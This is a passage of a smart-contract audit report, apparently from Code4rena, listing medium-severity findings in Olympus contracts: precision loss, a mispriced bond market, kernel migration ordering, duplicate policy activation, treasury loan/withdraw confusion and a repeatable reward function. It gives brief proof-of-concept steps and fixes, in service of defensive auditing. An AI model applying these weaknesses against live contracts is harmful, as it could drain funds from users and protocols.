0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/483\">[M-25] Moving average precision is lost</a></h2>\n<p><em>Submitted by hyh, also found by CertoraInc, d3e4, and rbserver</em></p>\n<p>Now the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.</p>\n<p>For example, <code>10000</code> moves of <code>990</code> size, <code>numObservations = 1000</code>. This will yield <code>0</code> on each update, while must yield <code>9900</code> increase in the moving average.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Moving average is calculated with the addition of the difference:</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Calculate new moving average</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> += (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> -= (</span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p><code>/ numObs</code> can lose precision as <code>currentPrice - earliestPrice</code> is usually small.</p>\n<p>It is returned on request as is:</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getMovingAverage</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Price_NotInitialized</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider storing the cumulative <code>sum</code>, while returning <code>sum / numObs</code> on request:</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getMovingAverage</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Price_NotInitialized</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-       </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+       </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">numObservations</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1238433469\">Oighty (Olympus) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Keeping track of the observations as a sum and then dividing is a good suggestion. The price values have 18 decimals and the max discrepancy introduced is very small (10**-15) with expected parameter ranges. The potential risk to the protocol seems low though.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1240994248\">hyh (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Please notice that discrepancy here is unbounded, i.e. the logic itself does not have any max discrepancy, the divergence between fact and recorded value can pile up over time without a limit.</p>\n<p>If you do imply that markets should behave in some way that minuses be matched with pluses, then I must say that they really shouldn’t.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/483\">Oighty (Olympus) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1249930031\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Debating between QA and Medium on this one. I am going to award it as medium because there is a potential to leak some value due to this imprecision compounding over time. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-26-cushion-bond-markets-are-opened-at-wall-price-rather-than-current-price\" style=\"position:relative;\"><a href=\"#m-26-cushion-bond-markets-are-opened-at-wall-price-rather-than-current-price\" aria-label=\"m 26 cushion bond markets are opened at wall price rather than current price permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/485\">[M-26] Cushion bond markets are opened at wall price rather than current price</a></h2>\n<p><em>Submitted by 0x52</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L363-L469\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L363-L469</a><br></p>\n<p>Incorrect initial bond market price.</p>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 initialPrice = range.wall.high.price.mulDiv(bondScale, oracleScale);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 initialPrice = invWallPrice.mulDiv(bondScale, oracleScale);</span></span></code></pre>\n<p>In the above lines the initial prices are set to the wall price rather than the current price as indicated in documentation.</p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Initial price should be updated to open bond market at current price rather than wall price.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1235667143\">Oighty (Olympus) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>This is more of a design decision than a bug. However, we did make this change in the code prior to the audit (it didn’t get reflected in the repo). @ind-igo not sure how you want to handle.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1251683341\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Going to award as Medium assuming no additional input from sponsor on the topic. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1252616779\">Oighty (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>It does deviate from the spec so I guess that’s appropriate. The system actually would work as-is, but would be less responsive to price movements into the cushions since the bond market would have to decay (which requires waiting) to reach the current market price vs. instantly providing a buy/sell at the current price.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-27-unexecutable-proposals-when-actionsmigratekernel-is-not-last-instruction\" style=\"position:relative;\"><a href=\"#m-27-unexecutable-proposals-when-actionsmigratekernel-is-not-last-instruction\" aria-label=\"m 27 unexecutable proposals when actionsmigratekernel is not last instruction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/51\">[M-27] Unexecutable proposals when <code>Actions.MigrateKernel</code> is not last instruction</a></h2>\n<p><em>Submitted by Lambda</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61\">https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61</a><br></p>\n<p>In <code>INSTR.sol</code>, it is correctly checked that a <code>ChangeExecutor</code> instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid.<br>\nHowever, the same problem can occur for <code>MigrateKernel</code>. For instance, let’s say we have a <code>MigrateKernel</code> followed by a <code>DeactivatePolicy</code> action. The <code>MigrateKernel</code> action will change the value of <code>kernel</code> within the policy. The <code>DeactivatePolicy</code> action tries to call <code>setActiveStatus</code> on the policy. However, this has a <code>onlyKernel</code> modifier and the call will therefore fail when it is done after the value of <code>kernel</code> was changed.</p>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Perform the same check for <code>MigrateKernel</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/51#issuecomment-1236245145\">fullyallocated (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Thank you; good catch</p>\n</blockquote>\n<hr>\n<h2 id=\"m-28-activating-same-policy-multiple-times-in-kernel-possible\" style=\"position:relative;\"><a href=\"#m-28-activating-same-policy-multiple-times-in-kernel-possible\" aria-label=\"m 28 activating same policy multiple times in kernel possible permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/52\">[M-28] Activating same Policy multiple times in Kernel possible</a></h2>\n<p><em>Submitted by Lambda, also found by enckrish</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L296\">https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L296</a><br></p>\n<p>To check that an already active policy is not added a second time, <code>isActive()</code> is called on the policy. However, <code>policy</code> could be a malicious contract that always returns <code>false</code> for <code>isActive()</code>. In such a scenario, it would be possible to activate the policy multiple times for the same Kernel. This would break uniqueness invariants such that <code>_deactivatePolicy()</code> no longer works. However, it could also be used for a DoS attack: As <code>_reconfigurePolicies</code> and <code>_migrateKernel</code> iterate over those lists that now contain duplicates, they could run out of gas if a policy is activated enough times.</p>\n<h3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check <code>getPolicyIndex[policy_] != 0</code> instead of relying on a value of an untrusted contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1238281166\">0xLienid (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>@ind-igo a few other submissions also mention problems with over-reliance on policy.isActive (i.e. <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/368\">#368</a>). Might be worth mitigating with the suggested step here or the check on activePolicies[index] like 368 mentions.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1241161485\">ind-igo (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>Dupe of #368 </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1251630127\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think this is separate from #368 which is about a policy deactivating that isn’t already active. </p>\n<p>I am a bit skeptical at the impact statement currently, but it does seem like protocol functionality does end up in a bad state with the typical policy lifecycle here. Will award as Medium unless Sponsor wants to provide some additional reasoning as to a downgrade. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1271829178\">ind-igo (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>While the issue is slightly different from #368, the solution is the exact same. The remediation has the new checks to prevent both of these issues.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-29-trsry-susceptible-to-loan--withdraw-confusion\" style=\"position:relative;\"><a href=\"#m-29-trsry-susceptible-to-loan--withdraw-confusion\" aria-label=\"m 29 trsry susceptible to loan  withdraw confusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/75\">[M-29] TRSRY susceptible to loan / withdraw confusion</a></h2>\n<p><em>Submitted by Trust, also found by 0xSky, datapunk, and tonisives</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102</a><br></p>\n<p>Treasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), _checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.</p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Policy P has getLoan permission</li>\n<li>setApprovalFor(policy, token, amount) was called to grant P permission to loan amount</li>\n<li>P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1239657706\">ind-igo (Olympus) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Confirmed. Good suggestion. Would put as low risk though.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1250396074\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Currently thinking Medium is appropriate for this issue, but will circle back on it. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1251404052\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>See <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/293\">#293</a> for a possible vector in which this could lead to loss of funds.  Going to leave as Medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-30-heartbeat-could-be-called-several-times-in-one-block-if-no-one-called-it-for-a-some-time\" style=\"position:relative;\"><a href=\"#m-30-heartbeat-could-be-called-several-times-in-one-block-if-no-one-called-it-for-a-some-time\" aria-label=\"m 30 heartbeat could be called several times in one block if no one called it for a some time permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/79\">[M-30] <code>Heart::beat()</code> could be called several times in one block if no one called it for a some time</a></h2>\n<p><em>Submitted by rvierdiiev, also found by datapunk, devtooligan, itsmeSTYJ, Jeiwan, Lambda, Trust, and zzzitron</em></p>\n<p><code>beat()</code> function is allowed to be called by anyone once in <code>frequency()</code> period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in <code>frequency()</code> period.\nHowever if <code>beat()</code> was last time called more then <code>frequency()</code> time ago then user can execute <code>beat()</code> function <code>(block.timestamp - lastBeat)/frequency()</code> times in a row in same block and get rewards.</p>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 